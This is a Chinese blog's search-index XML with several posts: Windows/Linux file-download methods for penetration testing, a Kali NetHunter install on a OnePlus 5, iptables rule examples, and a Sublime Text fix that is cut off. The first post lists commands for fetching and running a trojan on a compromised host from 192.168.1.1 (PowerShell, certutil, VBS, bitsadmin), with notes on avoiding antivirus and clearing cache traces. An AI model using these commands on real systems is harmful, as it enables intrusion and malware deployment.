<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>shell中文件下载方法</title>
    <url>/2020/04/04/shell%E4%B8%8B%E8%BD%BD/</url>
    <content><![CDATA[<p><font color=green>获得目标一定权限后可以下载木马或其它工具到目标机。下面列举了一些常用方法</font></p>
<h3 id="Powershell："><a href="#Powershell：" class="headerlink" title="Powershell："></a>Powershell：</h3><p>下载并保存文件：（容易被杀毒软件检测）</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">powershell (<span class="built_in">new-object</span> System.Net.WebClient).DownloadFile(<span class="string">'http://192.168.1.1/1.exe'</span>,<span class="string">'C:\test\1.exe'</span>)</span><br></pre></td></tr></table></figure>

<p>下载并执行文件：（无文件模式不易检测）</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">powershell (<span class="built_in">new-object</span> System.Net.WebClient).DownloadFile(<span class="string">'http://192.168.1.1/1.exe'</span>,<span class="string">'C:\test\1.exe'</span>);<span class="built_in">start-process</span> <span class="string">'C:\test\1.exe'</span></span><br></pre></td></tr></table></figure>

<a id="more"></a>

<h3 id="Certutil："><a href="#Certutil：" class="headerlink" title="Certutil："></a>Certutil：</h3><ul>
<li>保存在当前路径，文件名称同URL</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">certutil.exe -urlcache -split -f http://192.168.1.1/1.exe</span><br></pre></td></tr></table></figure>

<ul>
<li>保存在当前路径，指定保存文件名称</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">certutil.exe -urlcache -split -f http://192.168.1.1/1.txt 1.php</span><br></pre></td></tr></table></figure>

<p>使用downloader默认在缓存目录位置：<code>%USERPROFILE%\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content</code>保存下载的文件二进制副本。</p>
<ul>
<li>命令行删除缓存</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">certutil.exe -urlcache -split -f http://192.168.1.1/1.exe delete</span><br></pre></td></tr></table></figure>

<ul>
<li>查看缓存项目</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">certutil.exe -urlcache *</span><br></pre></td></tr></table></figure>



<h3 id="Vbs："><a href="#Vbs：" class="headerlink" title="Vbs："></a>Vbs：</h3><p>vbs downloader,使用msxml2.xmlhttp和adodb.stream对象<br>使用echo逐行追加写入(&gt;&gt;)test.vbs</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Set Post = CreateObject("Msxml2.XMLHTTP")</span><br><span class="line">Set Shell = CreateObject("Wscript.Shell")</span><br><span class="line">Post.Open "GET","http://192.168.1.1/1.exe",0</span><br><span class="line">Post.Send()</span><br><span class="line">Set aGet = CreateObject("ADODB.Stream")</span><br><span class="line">aGet.Mode = 3</span><br><span class="line">aGet.Type = 1</span><br><span class="line">aGet.Open()</span><br><span class="line">aGet.Write(Post.responseBody)</span><br><span class="line">aGet.SaveToFile "C:\test\1.exe",2</span><br></pre></td></tr></table></figure>

<p>然后执行</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cscript test.vbs</span><br></pre></td></tr></table></figure>



<h3 id="Bitsadmin："><a href="#Bitsadmin：" class="headerlink" title="Bitsadmin："></a>Bitsadmin：</h3><p>bitsadmin是一个命令行工具，可用于创建下载或上传工作和监测其进展情况。xp以后的Windows系统自带</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">bitsadmin /transfer n http://<span class="number">192.168</span>.<span class="number">1.1</span>/<span class="number">1</span>.exe  C:\test\update\<span class="number">1</span>.exe</span><br></pre></td></tr></table></figure>

<p>不支持https、ftp协议，php python带的服务器会出错，下载速度较慢</p>
<h3 id="Curl："><a href="#Curl：" class="headerlink" title="Curl："></a>Curl：</h3><p>在Linux中curl是一个利用URL规则在命令行下工作的文件传输工具，可以说是一款很强大的http命令行工具。它支持文件的上传和下载，是综合传输工具</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -O http://192.168.1.1/1.exe</span><br></pre></td></tr></table></figure>

<p>保存网页中的文件，要注意这里后面的url要具体到某个文件，不然抓不下来</p>
<h3 id="Wget："><a href="#Wget：" class="headerlink" title="Wget："></a>Wget：</h3><p>Linux系统中的wget是一个下载文件的工具， 简单直接，支持递归下载</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget  http://192.168.1.1/1.exe</span><br></pre></td></tr></table></figure>

<p>对下载文件重命名：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget -O  new.exe  http://192.168.1.1/1.exe</span><br></pre></td></tr></table></figure>

<p>限速下载：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget --limit-rate=300k http://192.168.1.1/1.exe</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>network</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>network</tag>
      </tags>
  </entry>
  <entry>
    <title>一加5手机上部署kali nethunter</title>
    <url>/2020/03/20/oneplus-install-nethunter/</url>
    <content><![CDATA[<p>为弘扬中华民族美德-勤俭持家，利用闲暇时间将手中的oneplus 5变废为宝。<br>Kali Linux NetHunter是一个开源的Android渗透测试平台，它可以轻松的使用各种安全工具，详情介绍请查阅官方网站。<br><font color=green>本文章基于oneplus 5手机，其它手机型号方法类似；各项基础知识不在文章赘述范围之内，自行了解；所需全部文件在末尾链接出，下面进入干货环节。</font><a id="more"></a><br><font color=red><strong>数据无价，任何操作前请确认数据已备份</strong>！！！</font></p>
<h4 id="1、刷入新的ROM系统"><a href="#1、刷入新的ROM系统" class="headerlink" title="1、刷入新的ROM系统"></a><strong>1、刷入新的ROM系统</strong></h4><p>国行的一加手机默认使用的是氢OS，而氧OS则自带google全家桶，在应用权限上也有区别，更多两者的区别信息自行查询。<br>1）下载氧OS ROM包；拷入手机根目录</p>
<p><img src="/images/upload/image-20200320005727319.png" alt="">2）手机数据双清操作；关机，然后后按住音量减键和锁屏键进入recovery  mode<br><img width=30% height=10% src="/images/upload/IMG_0560.JPG" >选择清除数据和缓存<br><img width=30% height=10% src="/images/upload/IMG_0561.JPG">然后点击完成！<br>3）刷入氧OS ROM包<br><img width=30% height=10% src="/images/upload/IMG_0560.JPG">点击安装本地升级文件，选中刚刚拷入的ROM包，等待安装完成，如下图<br><img width=30% height=10% src="/images/upload/IMG_0555.JPG"><strong>不要连接网络，会连接google检查更新，先跳过！！</strong></p>
<h4 id="2、获取ROOT权限"><a href="#2、获取ROOT权限" class="headerlink" title="2、获取ROOT权限"></a><strong>2、获取ROOT权限</strong></h4><p>1）开启手机开发者模式，打开usb调试选项；打开oem解锁；将手机设置为滑动解锁，通过usb数据线连接电脑<br>2）Windows下载安装mininal adb and fastboot软件<br><img width=30% height=10% src="/images/upload/img_000.png"><img width=50% height=10% src="/images/upload/img_001.png">3）下载第三方Recovery mode；将其放入mininal adb安装目录下，以方便操作<br><img width=30% height=10% src="/images/upload/img_002.png">4）下载Magisk Manager压缩包，拷入手机根目录（使用脸谱获得root权限）<br><img width=30% height=10% src="/images/upload/img_003.png">5）命令行进入adb安装目录；执行如下命令进入recovery mode<br><img width=50% height=10% src="/images/upload/img_004.png">然后点击高级—进入刷机模式<br><img width=50% height=10% src="/images/upload/img_005.png"><img width=50% height=10% src="/images/upload/img_006.jpg">6）然后解锁OEM<br><img width=50% height=10% src="/images/upload/img_007.png">片刻后出现界面，选择unlock the bootloader<img width=50% height=10% src="/images/upload/img_008.jpg"></p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>iptables常用示例</title>
    <url>/2019/02/27/iptables%E5%B8%B8%E7%94%A8%E7%A4%BA%E4%BE%8B/</url>
    <content><![CDATA[<p>在早期的Linux系统中，默认使用的是iptables防火墙管理服务来配置防火墙。尽管新型的firewalld防火墙管理服务已经被投入使用多年，但是大量的企业在生产环境中依然出于各种原因而继续使用iptables。所以本文提供了一些常用示例。<a id="more"></a><br>命令格式：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span>
</pre></td><td class="code"><pre><span class="line">$ iptables [-t 表名] 选项 [链名] [条件] [-j 控制类型]</span>
</pre></td></tr></table></figure>

<p>参数：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span>
<span class="line">2</span>
<span class="line">3</span>
<span class="line">4</span>
<span class="line">5</span>
<span class="line">6</span>
<span class="line">7</span>
<span class="line">8</span>
<span class="line">9</span>
<span class="line">10</span>
<span class="line">11</span>
<span class="line">12</span>
<span class="line">13</span>
</pre></td><td class="code"><pre><span class="line">-P 设置默认策略:iptables -P INPUT (DROP|ACCEPT)</span>
<span class="line">-F 清空规则链</span>
<span class="line">-L 查看规则链</span>
<span class="line">-A 在规则链的末尾加入新规则</span>
<span class="line">-I num 在规则链的头部加入新规则</span>
<span class="line">-D num 删除某一条规则</span>
<span class="line">-s 匹配来源地址IP/MASK，加叹号<span class="string">"!"</span>表示除这个IP外。</span>
<span class="line">-d 匹配目标地址</span>
<span class="line">-i 网卡名称 匹配从这块网卡流入的数据</span>
<span class="line">-o 网卡名称 匹配从这块网卡流出的数据</span>
<span class="line">-p 匹配协议,如tcp,udp,icmp</span>
<span class="line">--dport num 匹配目标端口号</span>
<span class="line">--sport num 匹配来源端口号</span>
</pre></td></tr></table></figure>

<h2 id="示例："><a href="#示例：" class="headerlink" title="示例："></a><a href="#示例：" title="示例："></a>示例：</h2><h3 id="删除已有规则："><a href="#删除已有规则：" class="headerlink" title="删除已有规则："></a><a href="#删除已有规则：" title="删除已有规则："></a>删除已有规则：</h3><p>在建立新的规则前，可能需要删除旧的规则，命令如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span>
</pre></td><td class="code"><pre><span class="line">$ iptables -F  (or) iptables -flush</span>
</pre></td></tr></table></figure>

<h3 id="设置链的默认规则："><a href="#设置链的默认规则：" class="headerlink" title="设置链的默认规则："></a><a href="#设置链的默认规则：" title="设置链的默认规则："></a>设置链的默认规则：</h3><p>所有链的默认规则为”ACCEPT”，若需将其它链(INPUT、FORWARD、OUTPUT)设置成”DROP”（拒绝），命令如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span>
<span class="line">2</span>
<span class="line">3</span>
</pre></td><td class="code"><pre><span class="line">$ iptables -P INPUT DROP</span>
<span class="line">$ iptables -P FORWARD DROP</span>
<span class="line">$ iptables -P OUTPUT DROP</span>
</pre></td></tr></table></figure>

<h3 id="拒绝指定ip地址："><a href="#拒绝指定ip地址：" class="headerlink" title="拒绝指定ip地址："></a><a href="#拒绝指定ip地址：" title="拒绝指定ip地址："></a>拒绝指定ip地址：</h3><p>当发现某个ip的异常连接，可以使用该命令阻止该地址的连接：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span>
</pre></td><td class="code"><pre><span class="line">$ iptables -A INPUT -s x.x.x.x -j drop</span>
</pre></td></tr></table></figure>

<p>对特定网卡的使用：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span>
<span class="line">2</span>
</pre></td><td class="code"><pre><span class="line">$ iptables -A INPUT -i eth0 -s x.x.x.x -j DROP</span>
<span class="line">$ iptables -A INPUT -i eth0 -p tcp -s x.x.x.x -j DROP</span>
</pre></td></tr></table></figure>

<h3 id="允许所有SSH的连接："><a href="#允许所有SSH的连接：" class="headerlink" title="允许所有SSH的连接："></a><a href="#允许所有SSH的连接：" title="允许所有SSH的连接："></a>允许所有SSH的连接：</h3><p>允许所有外部的ssh连接，且只允许eth0接口目标端口为22的数据包</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span>
<span class="line">2</span>
</pre></td><td class="code"><pre><span class="line">$ iptables -A INPUT  -i eth0 -p tcp --dport 22 -m state --state NEW,ESTABLISHED -j ACCEPT</span>
<span class="line">$ iptables -A OUTPUT -o eth0 -p tcp --sport 22 -m state --state ESTABLISHED -j ACCEPT</span>
</pre></td></tr></table></figure>

<h3 id="仅允许指定网络的SSH连接请求："><a href="#仅允许指定网络的SSH连接请求：" class="headerlink" title="仅允许指定网络的SSH连接请求："></a><a href="#仅允许指定网络的SSH连接请求：" title="仅允许指定网络的SSH连接请求："></a>仅允许指定网络的SSH连接请求：</h3><p>例如允许来自于192.168.1.0/24域的用户的ssh连接请求</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span>
<span class="line">2</span>
</pre></td><td class="code"><pre><span class="line">$ iptables -A INPUT  -i eth0 -p tcp -s 192.168.1.0/24 --dport 22 -m state --state NEW,ESTABLISHED -j ACCEPT</span>
<span class="line">$ iptables -A OUTPUT -o eth0 -p tcp --sport 22 -m state --state ESTABLISHED -j ACCEPT</span>
</pre></td></tr></table></figure>

<h3 id="允许http或https的连接请求："><a href="#允许http或https的连接请求：" class="headerlink" title="允许http或https的连接请求："></a><a href="#允许http或https的连接请求：" title="允许http或https的连接请求："></a>允许http或https的连接请求：</h3><p>允许所有的http请求</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span>
<span class="line">2</span>
</pre></td><td class="code"><pre><span class="line">$ iptables -A INPUT  -i eth0 -p tcp --dport 80 -m state --state NEW,ESTABLISHED -j ACCEPT</span>
<span class="line">$ iptables -A OUTPUT -o eth0 -p tcp --sport 80 -m state --state ESTABLISHED -j ACCEPT</span>
</pre></td></tr></table></figure>

<p>允许所有的https请求</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span>
<span class="line">2</span>
</pre></td><td class="code"><pre><span class="line">$ iptables -A INPUT  -i eth0 -p tcp --dport 443 -m state --state NEW,ESTABLISHED -j ACCEPT</span>
<span class="line">$ iptables -A OUTPUT -o eth0 -p tcp --sport 443 -m state --state ESTABLISHED -j ACCEPT</span>
</pre></td></tr></table></figure>

<h3 id="允许本地发起的ssh请求："><a href="#允许本地发起的ssh请求：" class="headerlink" title="允许本地发起的ssh请求："></a><a href="#允许本地发起的ssh请求：" title="允许本地发起的ssh请求："></a>允许本地发起的ssh请求：</h3><p>注意这与允许ssh连入的区别</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span>
<span class="line">2</span>
</pre></td><td class="code"><pre><span class="line">$ iptables -A OUTPUT -o eth0 -p tcp --dport 22 -m state --state NEW,ESTABLISHED -j ACCEPT</span>
<span class="line">$ iptables -A INPUT  -i eth0 -p tcp --sport 22 -m state --state ESTABLISHED -j ACCEPT</span>
</pre></td></tr></table></figure>

<h3 id="仅允许从本地发起到一个指定的网络的SSH请求："><a href="#仅允许从本地发起到一个指定的网络的SSH请求：" class="headerlink" title="仅允许从本地发起到一个指定的网络的SSH请求："></a><a href="#仅允许从本地发起到一个指定的网络的SSH请求：" title="仅允许从本地发起到一个指定的网络的SSH请求："></a>仅允许从本地发起到一个指定的网络的SSH请求：</h3><p>例如仅允许从内部连接到网域192.168.1.0/24</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span>
<span class="line">2</span>
</pre></td><td class="code"><pre><span class="line">$ iptables -A OUTPUT -o eth0 -p tcp -d 192.168.1.0/24 --dport 22 -m state --state NEW,ESTABLISHED -j ACCEPT</span>
<span class="line">$ iptables -A INPUT  -i eth0 -p tcp --sport 22 -m state --state ESTABLISHED -j ACCEPT</span>
</pre></td></tr></table></figure>

<h3 id="允许从本地发起的HTTPS连接请求："><a href="#允许从本地发起的HTTPS连接请求：" class="headerlink" title="允许从本地发起的HTTPS连接请求："></a><a href="#允许从本地发起的HTTPS连接请求：" title="允许从本地发起的HTTPS连接请求："></a>允许从本地发起的HTTPS连接请求：</h3><p>如果你想允许用户访问互联网，该规则能是用户发出安全的web流量请求，且能使用wget下载外部文件</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span>
<span class="line">2</span>
</pre></td><td class="code"><pre><span class="line">$ iptables -A OUTPUT -o eth0 -p tcp --dport 443 -m state --state NEW,ESTABLISHED -j ACCEPT</span>
<span class="line">$ iptables -A INPUT  -i eth0 -p tcp --sport 443 -m state --state ESTABLISHED -j ACCEPT</span>
</pre></td></tr></table></figure>

<p>如果需要允许http请求，只需将443改为80即可</p>
<h3 id="使用multiport-将多个规则结合起来："><a href="#使用multiport-将多个规则结合起来：" class="headerlink" title="使用multiport 将多个规则结合起来："></a><a href="#使用multiport-将多个规则结合起来：" title="使用multiport 将多个规则结合起来："></a>使用multiport 将多个规则结合起来：</h3><p>为了减少为每个端口都写一条独立规则的麻烦，可以使用multiport组合成一条规则。<br>例如允许所有ssh,http,https的流量访问</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span>
<span class="line">2</span>
</pre></td><td class="code"><pre><span class="line">$ iptables -A INPUT  -i eth0 -p tcp -m multiport --dports 22,80,443 -m state --state NEW,ESTABLISHED -j ACCEPT</span>
<span class="line">$ iptables -A OUTPUT -o eth0 -p tcp -m multiport --sports 22,80,443 -m state --state ESTABLISHED -j ACCEPT</span>
</pre></td></tr></table></figure>

<h3 id="允许外部ping内部主机："><a href="#允许外部ping内部主机：" class="headerlink" title="允许外部ping内部主机："></a><a href="#允许外部ping内部主机：" title="允许外部ping内部主机："></a>允许外部ping内部主机：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span>
<span class="line">2</span>
</pre></td><td class="code"><pre><span class="line">$ iptables -A INPUT  -p icmp --icmp-type <span class="built_in">echo</span>-request -j ACCEPT</span>
<span class="line">$ iptables -A OUTPUT -p icmp --icmp-type <span class="built_in">echo</span>-reply   -j ACCEPT</span>
</pre></td></tr></table></figure>

<h3 id="允许内部ping外部主机："><a href="#允许内部ping外部主机：" class="headerlink" title="允许内部ping外部主机："></a><a href="#允许内部ping外部主机：" title="允许内部ping外部主机："></a>允许内部ping外部主机：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span>
<span class="line">2</span>
</pre></td><td class="code"><pre><span class="line">$ iptables -A OUTPUT -p icmp --icmp-type <span class="built_in">echo</span>-request -j ACCEPT</span>
<span class="line">$ iptables -A INPUT  -p icmp --icmp-type <span class="built_in">echo</span>-reply -j ACCEPT</span>
</pre></td></tr></table></figure>

<h3 id="允许回环访问："><a href="#允许回环访问：" class="headerlink" title="允许回环访问："></a><a href="#允许回环访问：" title="允许回环访问："></a>允许回环访问：</h3><p>在本地可以访问127.0.0.1</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span>
<span class="line">2</span>
</pre></td><td class="code"><pre><span class="line">$ iptables -A INPUT -i lo -j ACCEPT</span>
<span class="line">$ iptables -A OUTPUT -o lo -j ACCEPT</span>
</pre></td></tr></table></figure>

<h3 id="负载平衡传入的网络流量："><a href="#负载平衡传入的网络流量：" class="headerlink" title="负载平衡传入的网络流量："></a><a href="#负载平衡传入的网络流量：" title="负载平衡传入的网络流量："></a>负载平衡传入的网络流量：</h3><p>使用iptables可以实现传入web流量的负载均衡<br>例如使用iptables nth将HTTPS流量负载平衡至三个不同的ip地址。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span>
<span class="line">2</span>
<span class="line">3</span>
</pre></td><td class="code"><pre><span class="line">$ iptables -A PREROUTING -i eth0 -p tcp --dport 443 -m state --state NEW -m nth --counter 0 --every 3 --packet 0 -j DNAT --to-destination 192.168.1.11:443</span>
<span class="line">$ iptables -A PREROUTING -i eth0 -p tcp --dport 443 -m state --state NEW -m nth --counter 0 --every 3 --packet 1 -j DNAT --to-destination 192.168.1.12:443</span>
<span class="line">$ iptables -A PREROUTING -i eth0 -p tcp --dport 443 -m state --state NEW -m nth --counter 0 --every 3 --packet 2 -j DNAT --to-destination 192.168.1.13:443</span>
</pre></td></tr></table></figure>

<h3 id="允许出站的DNS查询请求："><a href="#允许出站的DNS查询请求：" class="headerlink" title="允许出站的DNS查询请求："></a><a href="#允许出站的DNS查询请求：" title="允许出站的DNS查询请求："></a>允许出站的DNS查询请求：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span>
<span class="line">2</span>
</pre></td><td class="code"><pre><span class="line">$ iptables -A OUTPUT -p udp -o eth0 --dport 53 -j ACCEPT</span>
<span class="line">$ iptables -A INPUT  -p udp -i eth0 --sport 53 -j ACCEPT</span>
</pre></td></tr></table></figure>

<h3 id="允许内部网络域和外部网络通信："><a href="#允许内部网络域和外部网络通信：" class="headerlink" title="允许内部网络域和外部网络通信："></a><a href="#允许内部网络域和外部网络通信：" title="允许内部网络域和外部网络通信："></a>允许内部网络域和外部网络通信：</h3><p>如果防火墙上有两个网卡：eth1连接到外部网络(互联网)，eth0连接到内部网络(例如:192.168.1.x)。<br>使用以下规则允许内部网络与外部网络的通信</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span>
</pre></td><td class="code"><pre><span class="line">$ iptables -A FORWARD -i eth0 -o eth1 -j ACCEPT</span>
</pre></td></tr></table></figure>

<h3 id="允许来自指定网络的rsync请求："><a href="#允许来自指定网络的rsync请求：" class="headerlink" title="允许来自指定网络的rsync请求："></a><a href="#允许来自指定网络的rsync请求：" title="允许来自指定网络的rsync请求："></a>允许来自指定网络的rsync请求：</h3><p>多数情况MySQL和web服务在同一台服务器上，现在我们仅希望某些人员从内部网络(192.168.1.0/24)登陆数据库</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span>
<span class="line">2</span>
</pre></td><td class="code"><pre><span class="line">$ iptables -A INPUT -i eth0 -p tcp -s 192.168.1.0/24 --dport 3306 -m state --state NEW,ESTABLISHED -j ACCEPT</span>
<span class="line">$ iptables -A OUTPUT -o eth0 -p tcp --sport 3306 -m state --state ESTABLISHED -j ACCEPT</span>
</pre></td></tr></table></figure>

<h3 id="允许Sendmail-Postfix邮件服务："><a href="#允许Sendmail-Postfix邮件服务：" class="headerlink" title="允许Sendmail, Postfix邮件服务："></a><a href="#允许Sendmail-Postfix邮件服务：" title="允许Sendmail, Postfix邮件服务："></a>允许Sendmail, Postfix邮件服务：</h3><p>Sendmail和postfix都使用了25端口，因此只需允许来自25端口的连接请求即可</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span>
<span class="line">2</span>
</pre></td><td class="code"><pre><span class="line">$ iptables -A INPUT  -i eth0 -p tcp --dport 25 -m state --state NEW,ESTABLISHED -j ACCEPT</span>
<span class="line">$ iptables -A OUTPUT -o eth0 -p tcp --sport 25 -m state --state ESTABLISHED -j ACCEPT</span>
</pre></td></tr></table></figure>

<h3 id="允许IMAP和IMAPS："><a href="#允许IMAP和IMAPS：" class="headerlink" title="允许IMAP和IMAPS："></a><a href="#允许IMAP和IMAPS：" title="允许IMAP和IMAPS："></a>允许IMAP和IMAPS：</h3><p>例如允许IMAP/IMAP2流量，端口为143</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span>
<span class="line">2</span>
</pre></td><td class="code"><pre><span class="line">$ iptables -A INPUT  -i eth0 -p tcp --dport 143 -m state --state NEW,ESTABLISHED -j ACCEPT</span>
<span class="line">$ iptables -A OUTPUT -o eth0 -p tcp --sport 143 -m state --state ESTABLISHED -j ACCEPT</span>
</pre></td></tr></table></figure>

<p>例如允许IMAPS流量，端口为993</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span>
<span class="line">2</span>
</pre></td><td class="code"><pre><span class="line">$ iptables -A INPUT  -i eth0 -p tcp --dport 993 -m state --state NEW,ESTABLISHED -j ACCEPT</span>
<span class="line">$ iptables -A OUTPUT -o eth0 -p tcp --sport 993 -m state --state ESTABLISHED -j ACCEPT</span>
</pre></td></tr></table></figure>

<h3 id="允许POP3和POP3S访问："><a href="#允许POP3和POP3S访问：" class="headerlink" title="允许POP3和POP3S访问："></a><a href="#允许POP3和POP3S访问：" title="允许POP3和POP3S访问："></a>允许POP3和POP3S访问：</h3><p>例如允许POP3</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span>
<span class="line">2</span>
</pre></td><td class="code"><pre><span class="line">$ iptables -A INPUT  -i eth0 -p tcp --dport 110 -m state --state NEW,ESTABLISHED -j ACCEPT</span>
<span class="line">$ iptables -A OUTPUT -o eth0 -p tcp --sport 110 -m state --state ESTABLISHED -j ACCEPT</span>
</pre></td></tr></table></figure>

<p>例如允许POP3S访问</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span>
<span class="line">2</span>
</pre></td><td class="code"><pre><span class="line">$ iptables -A INPUT  -i eth0 -p tcp --dport 995 -m state --state NEW,ESTABLISHED -j ACCEPT</span>
<span class="line">$ iptables -A OUTPUT -o eth0 -p tcp --sport 995 -m state --state ESTABLISHED -j ACCEPT</span>
</pre></td></tr></table></figure>

<h3 id="防止Dos攻击："><a href="#防止Dos攻击：" class="headerlink" title="防止Dos攻击："></a><a href="#防止Dos攻击：" title="防止Dos攻击："></a>防止Dos攻击：</h3><p>命令如下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span>
</pre></td><td class="code"><pre><span class="line">$ iptables -A INPUT -p tcp --dport 80 -m <span class="built_in">limit</span> --<span class="built_in">limit</span> 25/minute --<span class="built_in">limit</span>-burst 100 -j ACCEPT</span>
</pre></td></tr></table></figure>

<p>参数解释：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span>
<span class="line">2</span>
<span class="line">3</span>
</pre></td><td class="code"><pre><span class="line">-m limit: 启用limit扩展</span>
<span class="line">–limit 25/minute: 允许最多每分钟25个连接（根据需求更改）。</span>
<span class="line">–limit-burst 100: 只有当连接达到limit-burst水平(此例为100)时才启用上述limit/minute限制。</span>
</pre></td></tr></table></figure>

<h3 id="端口转发："><a href="#端口转发：" class="headerlink" title="端口转发："></a><a href="#端口转发：" title="端口转发："></a>端口转发：</h3><p>将来自422端口的流量全部转到22端口。<br>这样我们既能通过422端口也能通过22端口进行ssh连接，启用DNAT转发。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span>
</pre></td><td class="code"><pre><span class="line">$ iptables -t nat -A PREROUTING -p tcp -d 192.168.1.37 --dport 422 -j DNAT --to 192.168.1.37:22</span>
</pre></td></tr></table></figure>

<p>还需要允许连接到442端口的请求</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span>
<span class="line">2</span>
</pre></td><td class="code"><pre><span class="line">$ iptables -A INPUT  -i eth0 -p tcp --dport 422 -m state --state NEW,ESTABLISHED -j ACCEPT</span>
<span class="line">$ iptables -A OUTPUT -o eth0 -p tcp --sport 422 -m state --state ESTABLISHED -j ACCEPT</span>
</pre></td></tr></table></figure>

<h3 id="记录丢弃的数据包"><a href="#记录丢弃的数据包" class="headerlink" title="记录丢弃的数据包"></a><a href="#记录丢弃的数据包" title="记录丢弃的数据包"></a>记录丢弃的数据包</h3><p>1、新建一个链名为loging</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span>
</pre></td><td class="code"><pre><span class="line">$ iptables -N loging</span>
</pre></td></tr></table></figure>

<p>2、将所有来自INPUT链的数据包跳转到loging链中</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span>
</pre></td><td class="code"><pre><span class="line">$ iptables -A INPUT -j loging</span>
</pre></td></tr></table></figure>

<p>3、为这些包自定义前缀，命为‘iptables packet dropped’</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span>
</pre></td><td class="code"><pre><span class="line">$ iptables -A loging -m <span class="built_in">limit</span> --<span class="built_in">limit</span> 2/min -j LOG --<span class="built_in">log</span>-prefix <span class="string">"iptables packet dropped: "</span> --<span class="built_in">log</span>-level 7</span>
</pre></td></tr></table></figure>

<p>4、丢弃这些数据包</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span>
</pre></td><td class="code"><pre><span class="line">$ iptables -A loging -j DROP</span>
</pre></td></tr></table></figure>]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>network</tag>
      </tags>
  </entry>
  <entry>
    <title>Sublime Text3无法安装包解决</title>
    <url>/2018/09/22/Sublime-Text3%E6%97%A0%E6%B3%95%E5%AE%89%E8%A3%85%E5%8C%85%E8%A7%A3%E5%86%B3/</url>
    <content><![CDATA[<p>最近学习GO语言用package control安装插件时，一直报错如下图：<br><img src="/images/upload/2019-02-282.png" alt="报错图片1"><br><img src="/images/upload/2019-02-281.png" alt="报错图片2"><br>看样子是channel_v3.json这个文件不能访问，然后将解决办法汇总如下。<a id="more"></a></p>
<h2 id="1-利用github"><a href="#1-利用github" class="headerlink" title="1.利用github"></a><a href="#1-利用github" title="1.利用github"></a>1.利用github</h2><p>通过官方下载最新的channel_v3文件，上传到自己的Github，然后修改Package Control的channels。<br>官方:<a href="https://packagecontrol.io/channel_v3.json" target="_blank" rel="noopener">channel_v3.json</a><br>有该问题且嫌麻烦的伙伴可以使用我的地址：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span>
</pre></td><td class="code"><pre><span class="line">https://raw.githubusercontent.com/knight-TBO/channel_v3/master/channel_v3.json</span>
</pre></td></tr></table></figure>

<p>使用方法：<br><img src="/images/upload/2019-02-283.png" alt="use1"><br><img src="/images/upload/2019-02-284.png" alt="use2"><br>在配置文件下添加下面的语句即可：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span>
<span class="line">2</span>
<span class="line">3</span>
<span class="line">4</span>
</pre></td><td class="code"><pre><span class="line"><span class="string">"channels"</span>:</span>
<span class="line">    [</span>
